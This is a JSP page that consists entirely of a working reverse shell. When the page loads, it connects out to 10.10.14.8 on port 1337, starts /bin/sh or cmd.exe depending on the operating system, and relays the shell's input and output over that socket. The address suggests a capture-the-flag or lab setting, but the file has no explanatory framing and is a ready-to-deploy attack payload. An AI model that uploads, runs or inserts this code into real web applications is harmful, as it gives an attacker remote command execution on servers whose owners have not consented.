<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream rh;
    OutputStream rm;

    StreamConnector( InputStream rh, OutputStream rm )
    {
      this.rh = rh;
      this.rm = rm;
    }

    public void run()
    {
      BufferedReader el  = null;
      BufferedWriter cfe = null;
      try
      {
        el  = new BufferedReader( new InputStreamReader( this.rh ) );
        cfe = new BufferedWriter( new OutputStreamWriter( this.rm ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = el.read( buffer, 0, buffer.length ) ) > 0 )
        {
          cfe.write( buffer, 0, length );
          cfe.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( el != null )
          el.close();
        if( cfe != null )
          cfe.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.8", 1337 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
